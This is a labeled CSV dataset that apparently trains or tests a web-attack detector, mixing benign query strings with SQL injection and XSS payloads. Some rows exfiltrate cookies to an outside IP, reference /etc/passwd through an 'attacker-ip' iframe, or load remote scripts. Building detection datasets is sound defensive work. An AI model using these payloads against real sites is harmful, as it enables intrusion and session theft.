payload,label
' or sleep(5)=',sqli
token=2ed1640&format=json,benign
waitfor delay '00:00:05'#,sqli
lang=id&email=orders@example.com&city=jakarta,benign
<script>alert(document.cookie)</script>,xss
lang=en&coupon=budget,benign
user_id=8667&price_max=9087&tab=phone,benign
'=0--+,sqli
session=2406815&search=echo&price_max=8721,benign
<body onload=confirm(123) >,xss
session=3521f30,benign
currency=usd&limit=7957&email=report@example.com,benign
user_id=999&offset=2870,benign
qty=6281&email=surakarta@example.com,benign
ORDER BY 16--,sqli
qty=8173,benign
limit=3332&offset=1296,benign
theme=dark&search=budi,benign
qty=5734,benign
"-1' UNION SELECT 1,2,3--+",sqli
sort=asc&category=delta&size=m,benign
lang=id&format=json&sort=asc,benign
city=laptop&callback=citra,benign
"""""",sqli
theme=dark&lang=id,benign
AnD SLEEP(5)#,sqli
currency=usd&format=json,benign
RANDOMBLOB(1000000000/2),sqli
"""<img src='x' onerror='alert(10)' />""",xss
session=5c365a3&email=alice@example.com&city=settings,benign
"')) or benchmark(10000000,MD5(1))#",sqli
price_min=9395&session=1847684,benign
color=budget&price_max=3681&lang=en,benign
format=json&limit=7754,benign
<body onload=alert(123) >,xss
category=camera,benign
token=44f6d8c,benign
pg_SLEEP(5)#,sqli
page=1216&lang=id&name=settings,benign
AND 1=1#,sqli
theme=dark&limit=9486&ref=dashboard,benign
format=json&price_max=5665&sort=desc,benign
AND 7506=9091 AND ('5913=5913,sqli
"or benchmark(50000000,MD5(1))",sqli
category=citra&lang=en&price_max=5627,benign
WHERE 1=1 AND 1=0#,sqli
currency=usd&format=json&lang=en,benign
""")) or pg_sleep(5)--",sqli
page=4787&city=camera,benign
name=camera&coupon=invoice&currency=usd,benign
q=invoice&token=4e56c92,benign
theme=dark&tab=shoes,benign
callback=settings&view=grid,benign
'-alert(1)-',xss
theme=dark&user_id=2755,benign
size=m&name=citra,benign
sort=asc&price_min=6358&view=grid,benign
"confirm(""test"")",xss
sort=desc&ref=dashboard&currency=usd,benign
qty=610,benign
ORDER BY 30--,sqli
coupon=laptop&q=echo,benign
tab=settings&email=settings@example.com,benign
;waitfor delay '0:0:5'--,sqli
email=camera@example.com,benign
ORDER BY 22#,sqli
""") or benchmark(10000000,MD5(1))#",sqli
search=budi,benign
AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe,sqli
qty=9235&ref=book&price_max=7360,benign
-2,sqli
session=3208a8c&price_min=2955,benign
"?s=""onerror=""alert%261par;1337%26rpar;""",xss
size=m,benign
sort=desc&token=48be168,benign
limit=1270&offset=4452&token=1b3fa5c,benign
ORDER BY 11--,sqli
1)) or pg_sleep(5)--,sqli
ORDER BY 20--,sqli
1 or pg_sleep(5)--,sqli
AND 1=1 AND '%'=',sqli
--><img src=x onerror=prompt(document.domain)>,xss
city=settings,benign
';alert('abc');',xss
"<img src=x onerror=window[""al""+""ert""](document.cookie)>",xss
size=m&email=echo@example.com,benign
ORDER BY 13#,sqli
theme=dark&size=m&qty=2318,benign
qty=4396&price_max=5616,benign
ORDER BY 5--,sqli
sort=asc&price_max=9892,benign
redirect=/home,benign
ORDER BY 20#,sqli
WHERE 1=1 AND 1=1#,sqli
token=4432819&lang=en,benign
ORDER BY 29--,sqli
coupon=profile,benign
token=57ca662&search=phone&price_max=7998,benign
price_min=2142&page=4277&session=437d602,benign
ref=shoes&redirect=/home&price_min=7735,benign
callback=echo,benign
"and (select substring(@@version,3,1))='c'",sqli
view=grid&color=profile&redirect=/home,benign
' OR '1,sqli
qty=8038&callback=jakarta,benign
session=2b5c026,benign
or SLEEP(5)--,sqli
redirect=/home&price_max=486&qty=8039,benign
"""));waitfor delay '0:0:5'--",sqli
token=28dcdad,benign
<img src=1 onerror=print()>,xss
",",sqli
token=36b5129&qty=798&limit=8109,benign
ORDER BY 6--,sqli
price_max=1590&email=settings@example.com&category=camera,benign
price_min=2689&id=3491&price_max=7249,benign
ORDER BY 15#,sqli
limit=591&price_max=5&search=report,benign
search=alice&page=8565&limit=5963,benign
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#,sqli
<IMG SRC=javascript:alert(&quot;XSS&quot;)>,xss
<IMG sRC=X onerror=jaVaScRipT:alert`xss`>,xss
coupon=profile&city=surakarta,benign
offset=797&redirect=/home&city=dashboard,benign
<script>alert(document.cookie);</script>,xss
user_id=5583&email=budi@example.com&token=487af52,benign
lang=id&offset=1930,benign
tab=camera&format=json,benign
callback=echo&format=json,benign
city=foxtrot&color=camera,benign
page=4287&sort=asc,benign
AND 1=0#,sqli
price_min=5978,benign
tab=orders&limit=2855,benign
<body onload=prompt(123) >,xss
city=surakarta,benign
"' or benchmark(10000000,MD5(1))#",sqli
format=json&offset=7484&session=5641cfb,benign
page=8495&category=alice,benign
user_id=8692&category=camera,benign
1' ORDER BY 3--+,sqli
<img src=x onerror=alert(test)>,xss
format=json&redirect=/home,benign
"""",sqli
qty=8690&redirect=/home&coupon=invoice,benign
size=m&category=settings,benign
view=grid&id=9503&user_id=5280,benign
sort=asc&token=20d3f96&size=m,benign
{{$on.constructor('alert(1)')()}},xss
"benchmark(50000000,MD5(1))--",sqli
city=camera&name=budi,benign
page=9205&price_min=9065,benign
AND 1=0,sqli
WHERE 1=1 AND 1=1--,sqli
email=camera@example.com&user_id=2195&city=invoice,benign
ORDER BY 14--,sqli
ORDER BY 21--,sqli
theme=dark&email=echo@example.com&name=invoice,benign
category=delta&session=27f1637,benign
""");waitfor delay '0:0:5'--",sqli
size=m&color=camera,benign
1-true,sqli
tab=delta&sort=asc&price_min=7497,benign
"?s=""onerror=""innerHTML=decodeURIComponet.call`${location.hash}`""#<img src onerror=alert(1337)>",xss
size=m&sort=desc,benign
session=14677d1&format=json&currency=usd,benign
color=budget&tab=invoice,benign
size=m&price_max=6303,benign
limit=6493&qty=4897&lang=id,benign
page=2726,benign
currency=usd&city=dashboard&redirect=/home,benign
ref=delta&city=delta&name=camera,benign
session=44c0cd8,benign
city=echo&coupon=phone,benign
"<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://xss.rocks/scriptlet.html""></OBJECT>",xss
ORDER BY 4#,sqli
%22%3E%3CIMG%20sRC=X%20onerror=jaVaScRipT:alert`xss`%3E,xss
view=grid&sort=desc&size=m,benign
AnD SLEEP(5),sqli
format=json&sort=asc,benign
""" or pg_sleep(5)--",sqli
coupon=budget&lang=en,benign
\\,sqli
'or<script>alert(1)</script>,xss
"<img src="""" onerror=""innerHTML=decodeURIComponent.call`${location.hash}`"" ""="""">",xss
name=echo&sort=asc,benign
email=jakarta@example.com&name=orders&ref=profile,benign
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP),sqli
ORDER BY 27--,sqli
q=foxtrot&user_id=3942&session=4c8af2b,benign
price_min=879,benign
lang=id&limit=5919,benign
price_max=440&callback=foxtrot&user_id=3091,benign
category=orders&lang=id,benign
AND false,sqli
offset=3506&callback=delta&email=camera@example.com,benign
color=dashboard&user_id=1495,benign
qty=3044&ref=book&session=12f212c,benign
offset=1900&lang=en,benign
(SELECT * FROM (SELECT(SLEEP(5)))ecMj),sqli
q=foxtrot,benign
color=surakarta&id=6879&sort=asc,benign
or SLEEP(5)=',sqli
currency=usd&id=6165&qty=3362,benign
redirect=/home&offset=3071,benign
sort=desc&id=2287&callback=echo,benign
alert(document.cookie),xss
price_min=2596,benign
'-alert(document.cookie)-',xss
session=5384e39&offset=8562&category=report,benign
session=12e133f&lang=id&city=profile,benign
""";waitfor delay '0:0:5'--",sqli
tab=settings&coupon=shoes&theme=dark,benign
name=budget,benign
"' UNION SELECT NULL,NULL,NULL--",sqli
' OR '' = ',sqli
lang=id&currency=usd,benign
theme=dark&offset=9627,benign
ORDER BY 12--,sqli
limit=2254,benign
1*56,sqli
1) or sleep(5)#,sqli
--><img src=x onerror=alert(document.domain)>,xss
&&SLEEP(5)#,sqli
format=json&lang=id&theme=dark,benign
ORDER BY 28--,sqli
qty=5847&city=jakarta&format=json,benign
ref=echo&sort=desc&view=grid,benign
ref=laptop&limit=6966,benign
email=budi@example.com&session=d7ca65&format=json,benign
callback=settings,benign
"<img src=x onerror=window[""prompt""](document.cookie)>",xss
AnD SLEEP(5)--,sqli
lang=en&coupon=settings&price_max=6690,benign
redirect=/home&qty=7706,benign
"<img src="""" onerror=""location=/javascript:/.source+location"" ""="""">",xss
"?s=""onerror=""location=/javascript:/.source%2Blocation""&a=%0A+alert(1337)",xss
session=1ff2143&price_min=1294&size=m,benign
qty=5622&price_max=8172,benign
<audio src/onerror=prompt(123)>,xss
ORDER BY 12#,sqli
city=report&price_min=9629&search=report,benign
lang=id&tab=surakarta,benign
user_id=622&search=foxtrot&email=citra@example.com,benign
""")) or sleep(5)=""",sqli
ORDER BY 31337--,sqli
"<img src="""" onerror=""alert`1337`"" ""="""">",xss
name=report&lang=id,benign
id=2348&search=book,benign
""")) or benchmark(10000000,MD5(1))#",sqli
</script><script>alert(document.cookie)</script>,xss
category=profile&qty=4891,benign
ORDER BY 2--,sqli
OR x=x,sqli
city=budi&tab=delta,benign
<body onload=window.location.assign('https://www.google.com')>,xss
offset=9465&user_id=2263,benign
email=shoes@example.com&redirect=/home&name=report,benign
color=citra,benign
<script <script>>alert('test')</script>,xss
view=grid&qty=6938&callback=invoice,benign
HAVING 1=0,sqli
format=json&size=m&ref=phone,benign
%2c(select%20*%20from%20(select(sleep(10)))a),sqli
callback=book&session=3da7908,benign
sort=desc,benign
id=8939&email=budi@example.com&currency=usd,benign
"SLEEP(5)=""",sqli
page=6438,benign
<body onclick=print()>,xss
page=3947,benign
search=shoes&coupon=echo&tab=citra,benign
ref=book&view=grid,benign
id=4346&ref=delta,benign
ORDER BY 26#,sqli
color=profile,benign
q=jakarta&coupon=jakarta&limit=6746,benign
--><img src=x onerror=alert('test')>,xss
lang=id&sort=desc,benign
qty=7553,benign
or pg_SLEEP(5),sqli
ORDER BY 7#,sqli
email=phone@example.com,benign
""" or sleep(5)#",sqli
theme=dark&email=laptop@example.com,benign
size=m&session=25212b8,benign
ORDER BY 1#,sqli
name=settings,benign
callback=alice&price_max=9695,benign
id=2371&offset=4107&theme=dark,benign
;,sqli
email=orders@example.com&token=3268c40,benign
lang=en&sort=desc&redirect=/home,benign
coupon=budi,benign
page=4263,benign
ORDER BY 13--,sqli
limit=9336&ref=orders,benign
color=dashboard&format=json,benign
limit=1164&price_min=1105&id=1161,benign
AND 1=1--,sqli
search=echo&qty=5731,benign
session=5556b82&ref=report&id=3520,benign
AS INJECTX WHERE 1=1 AND 1=0,sqli
ORDER BY 27#,sqli
"<img src="""" onerror=""window.onerror=alert;throw 1337"" ""="""">",xss
session=5cce421,benign
sort=asc&email=alice@example.com&token=f16644,benign
<img src='x' onerror='alert(document.cookie)' />,xss
ORDER BY 11#,sqli
tab=budi&view=grid&color=camera,benign
ref=shoes&name=budi&page=7488,benign
category=budget&color=laptop,benign
"'\""",sqli
ORDER BY 19#,sqli
ORDER BY 22--,sqli
"""onmouseover=alert(document.cookie)//",xss
"?s=""onerror=""alert`1337`""",xss
"<img src=x onerror=""&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041"">",xss
category=budget&format=json&sort=asc,benign
"<svg  xmlns=""http://www.w3.org/2000/svg"" onload=""alert(document.cookie)""/>",xss
price_max=1194&theme=dark,benign
OR x=y#,sqli
</script><script>alert(document.cookie);</script>,xss
callback=echo&currency=usd&price_max=9450,benign
sort=asc,benign
qty=7252&redirect=/home,benign
"""><script>prompt(document.domain)</script>",xss
https://brutelogic.com.br/poc.svg,xss
session=349eefb&lang=en&offset=1585,benign
ORDER BY 6#,sqli
AND 7506=9091 AND (5913=5913,sqli
offset=4401&limit=2477,benign
SLEEP(5)--,sqli
1-false,sqli
'or<img src=0 onerror=alert('1')>,xss
price_max=2878&page=2249&user_id=8134,benign
ref=delta&color=budi&sort=asc,benign
lang=id&page=2578&email=camera@example.com,benign
AND 1083=1083 AND ('1427=1427,sqli
category=alice,benign
email=surakarta@example.com&q=delta&category=shoes,benign
"1) or benchmark(10000000,MD5(1))#",sqli
sort=desc&price_min=682&offset=3581,benign
'=',sqli
view=grid,benign
email=delta@example.com&price_min=6921&qty=1745,benign
name=profile&offset=1295&view=grid,benign
lang=id,benign
name=budi&ref=surakarta,benign
callback=orders,benign
"<img src="""" onerror=""alert&1par;1337&rpar;"" ""="""">",xss
city=invoice&ref=orders,benign
OR x=x--,sqli
search=profile,benign
' AND id IS NULL; --,sqli
"""><img src=x onerror=alert(document.domain)>",xss
name=settings&token=3bdf2a8,benign
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#,sqli
sort=desc&lang=id&session=25c35ab,benign
pg_SLEEP(5),sqli
category=orders&tab=profile,benign
"+benchmark(3200,SHA1(1))+'",sqli
"<IMG """"""><SCRIPT>alert(document.cookie)</SCRIPT>""\>",xss
"' UNION SELECT NULL,NULL,NULL,NULL--",sqli
ORDER BY 15--,sqli
ORDER BY 25--,sqli
"""><script>prompt(1)</script>",xss
or pg_SLEEP(5)#,sqli
"AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",sqli
price_min=6210&price_max=8099,benign
"""><script>alert(document.cookie)</script>",xss
AND 1=0 AND '%'=',sqli
search=invoice&lang=en,benign
%00,sqli
ORDER BY 17--,sqli
lang=id&ref=alice,benign
token=3e87fc7&callback=report,benign
sort=desc&coupon=citra&lang=en,benign
ORDER BY 3#,sqli
page=928,benign
ref=delta,benign
--><body onload=alert(123) >,xss
ORDER BY 10#,sqli
color=echo,benign
ORDER BY 18--,sqli
ORDER BY 2#,sqli
page=4521&ref=book,benign
city=dashboard,benign
ORDER BY 24--,sqli
""") or pg_sleep(5)--",sqli
sort=desc&limit=9418,benign
price_max=8067&lang=en,benign
category=profile&limit=3756&callback=phone,benign
callback=dashboard&sort=desc,benign
session=3b63c84&page=9570,benign
qty=8648&callback=budget&price_max=1997,benign
lang=id&price_min=2194,benign
"<IMG SRC=/ onerror=""alert(String.fromCharCode(88,83,83))""></img>",xss
category=shoes&coupon=foxtrot,benign
' AnD SLEEP(5) ANd '1,sqli
1)) or sleep(5)#,sqli
ref=citra&price_max=9065,benign
SLEEP(5)#,sqli
token=ac6435&city=book&format=json,benign
1' ORDER BY 2--+,sqli
format=json&token=3573626&lang=en,benign
limit=4061&search=shoes&sort=desc,benign
"and (select substring(@@version,2,1))='y'",sqli
SLEEP(5)=',sqli
ORDER BY 16#,sqli
limit=4730&city=budi,benign
sort=asc&price_min=3240&offset=1507,benign
qty=4531&view=grid,benign
coupon=phone&sort=desc,benign
pg_sleep(5)--,sqli
"""><svg onload=alert(1)>",xss
AND 7300=7300 AND 'pKlZ'='pKlY,sqli
redirect=/home&ref=surakarta,benign
tab=budget&token=389ed19&limit=9346,benign
ORDER BY 17#,sqli
"<iframe src=""javascript:alert(test)"">",xss
</TITLE><SCRIPT>alert(document.cookie);</SCRIPT>,xss
session=525c8b6,benign
OR 1=0,sqli
session=4449da7&currency=usd,benign
format=json&category=delta,benign
redirect=/home&view=grid&price_max=4478,benign
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--,sqli
qty=3510,benign
"""-top['al\x65rt']('sailay')-""",xss
format=json&limit=5027,benign
coupon=report,benign
limit=3322&sort=asc,benign
search=foxtrot&limit=9547,benign
email=invoice@example.com&limit=6023&theme=dark,benign
price_min=1801,benign
tab=phone&page=6807,benign
'LIKE',sqli
qty=7564,benign
qty=8814&offset=7255&currency=usd,benign
<svg/onload=alert(1)>,xss
lang=en&sort=desc,benign
id=3316,benign
"') or benchmark(10000000,MD5(1))#",sqli
);waitfor delay '0:0:5'--,sqli
--><img src=x onerror=alert(document.cookie)>,xss
sort=desc&tab=orders,benign
<iframe src='https://testforiframe.site/'>,xss
"and (select substring(@@version,3,1))='X'",sqli
"""><script>alert(document.domain + '\n' + ""Name"")</script>",xss
') or sleep(5)=',sqli
token=1228bfc&color=camera&city=budi,benign
"""><script>prompt(document.cookie)</script>",xss
ORDER BY 8--,sqli
callback=alice&offset=5363&format=json,benign
waitfor delay '00:00:05',sqli
' OR 'x'='x,sqli
WHERE 1=1 AND 1=0--,sqli
limit=9251&q=surakarta,benign
size=m&page=9618&search=settings,benign
javascript:alert(document.cookie),xss
name=citra,benign
limit=6376&price_min=6289&view=grid,benign
javascript:prompt(document.cookie),xss
tab=camera&price_min=2833&size=m,benign
color=shoes&name=alice&user_id=3305,benign
<audio src/onerror=alert(1)>,xss
callback=foxtrot&session=3bd3d6a&sort=desc,benign
search=foxtrot&view=grid&size=m,benign
coupon=camera,benign
token=329ddec&limit=6249,benign
qty=9069&id=2020,benign
city=shoes&email=book@example.com&search=laptop,benign
<script>'-alert(1)-'</script>,xss
&&SLEEP(5)--,sqli
HAVING 1=1,sqli
ref=profile&qty=7836,benign
ORDER BY 4--,sqli
<script>window.location.assign('https://secure.eicar.org/eicar_com.zip')</script>,xss
<audio src/onerror=alert('test')>,xss
--><svg/onload=alert(document.domain)>,xss
+ SLEEP(10) + ',sqli
'&&SLEEP(5)&&'1,sqli
ORDER BY 24#,sqli
""") or sleep(5)=""",sqli
view=grid&offset=8503&price_min=2974,benign
color=alice&email=settings@example.com&price_max=6484,benign
callback=orders&token=388ea15,benign
ORDER BY 23--,sqli
lang=en,benign
ORDER BY 8#,sqli
user_id=1531&price_max=2763&city=jakarta,benign
"AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",sqli
ORDER BY SLEEP(5),sqli
"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",xss
name=laptop,benign
ORDER BY 31337#,sqli
search=phone&size=m&ref=book,benign
""" or sleep(5)=""",sqli
"' AND MID(VERSION(),1,1) = '5';",sqli
ORDER BY 21#,sqli
<Script>alert(document.cookie)</Script>,xss
limit=7547,benign
ref=citra,benign
color=shoes,benign
ORDER BY SLEEP(5)--,sqli
size=m&price_max=3083,benign
offset=7528&tab=book&page=4804,benign
<BODY ONLOAD=alert('1')>,xss
or SLEEP(5)#,sqli
ORDER BY 14#,sqli
sort=desc&redirect=/home,benign
' or sleep(5)#,sqli
theme=dark&city=report,benign
ORDER BY 1--,sqli
name=budget&token=4502d5f&page=8703,benign
currency=usd,benign
view=grid&category=alice&redirect=/home,benign
email=settings@example.com,benign
email=jakarta@example.com&name=book&coupon=foxtrot,benign
"<script>new Image().src=""http://192.168.1.6/?c=""+document.cookie;</script>",xss
limit=1321&user_id=6641&size=m,benign
AS INJECTX WHERE 1=1 AND 1=1,sqli
email=surakarta@example.com&page=8420,benign
currency=usd&city=laptop&redirect=/home,benign
lang=en&lang=id,benign
limit=9661&currency=usd,benign
"1)) or benchmark(10000000,MD5(1))#",sqli
"' UNION SELECT NULL,NULL--",sqli
session=103d51c&redirect=/home,benign
q=camera,benign
OR 3409=3409 AND ('pytW' LIKE 'pytY,sqli
'|| pg_sleep(10) --+,sqli
price_max=126&page=3461,benign
"?s=""onerror=""window.onerror=alert;throw 1337""",xss
ORDER BY 19--,sqli
price_max=1877&qty=1772&callback=echo,benign
q=delta,benign
page=3269,benign
page=9775&sort=desc,benign
AS INJECTX WHERE 1=1 AND 1=0#,sqli
qty=8815,benign
sort=desc&price_min=5655,benign
city=shoes,benign
limit=6276,benign
q=invoice&lang=en&currency=usd,benign
token=1db6259&offset=4985,benign
ref=citra&token=4754d96,benign
",(select * from (select(sleep(10)))a)",sqli
"1' GROUP BY 1,2,3--+",sqli
"prompt(""test"")",xss
lang=en&city=orders,benign
page=8973,benign
size=m&search=shoes&qty=1102,benign
ORDER BY 23#,sqli
name=alice&offset=9677&search=report,benign
AND 1=1,sqli
lang=en&callback=delta,benign
"and (select substring(@@version,1,1))='M'",sqli
qty=2763&session=5b90675,benign
id=1536,benign
<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>,xss
ORDER BY 29#,sqli
user_id=7439&format=json&theme=dark,benign
ref=laptop&name=alice&q=delta,benign
currency=usd&coupon=profile,benign
ORDER BY 7--,sqli
``,sqli
"1' ORDER BY 1,2,3--+",sqli
tab=shoes&user_id=7416&category=budget,benign
city=dashboard&id=3682,benign
sort=desc&city=laptop,benign
"and (select substring(@@version,1,1))='X'",sqli
tab=dashboard&size=m,benign
offset=4912&session=2919ab6,benign
callback=book,benign
currency=usd&ref=profile,benign
') or pg_sleep(5)--,sqli
q=camera&size=m,benign
lang=en&view=grid&sort=desc,benign
id=9078&lang=id,benign
confirm(123),xss
"SLEEP(1)/*' or SLEEP(1) or '"" or SLEEP(1) or ""*/",sqli
AND 1083=1083 AND (1427=1427,sqli
"<iframe src=""http://attacker-ip/test.php?file=/etc/passwd"">\</iframe>",xss
ORDER BY 3--,sqli
tab=alice&theme=dark,benign
"and (select substring(@@version,2,1))='i'",sqli
ORDER BY 30#,sqli
http://xss.rocks/scriptlet.html,xss
price_min=8701&limit=3815&page=6772,benign
<IMG SRC=javascript:alert('XSS')>,xss
HAVING 1=0--,sqli
"""><script src=""https://testforiframe.site/""></script>",xss
ORDER BY 9--,sqli
token=3a109d3,benign
HAVING 1=1--,sqli
ORDER BY 28#,sqli
q=alice&lang=id&user_id=7802,benign
category=delta,benign
q=laptop&page=1436,benign
1 AND (SELECT * FROM Users) = 1,sqli
offset=6956&tab=jakarta&sort=asc,benign
qty=5153&session=294d57e,benign
page=1466&coupon=shoes&redirect=/home,benign
price_max=8971&ref=invoice&city=citra,benign
ref=laptop&price_min=1478&category=echo,benign
AS INJECTX WHERE 1=1 AND 1=1#,sqli
q=citra&qty=1660,benign
category=invoice&limit=1771,benign
</script><script>alert(1)</script>,xss
format=json&limit=6506&name=alice,benign
&lt;img src=0 onerror=alert(&#39;1&#39;)&gt;,xss
tab=invoice&page=7057,benign
price_max=4935&view=grid&size=m,benign
format=json&email=alice@example.com,benign
"-1 UNION SELECT 1 INTO @,@,@",sqli
offset=9160&callback=budget&tab=settings,benign
coupon=dashboard&page=9131,benign
OR 1=1#,sqli
price_min=8314,benign
"or SLEEP(5)=""",sqli
token=114b8ff&theme=dark,benign
<IMG SRC=JaVaScRiPt:alert('XSS')>,xss
limit=3156&sort=desc,benign
name=profile&coupon=orders&offset=7674,benign
sort=asc&color=jakarta,benign
' OR 1 -- -,sqli
price_min=6952&user_id=4950,benign
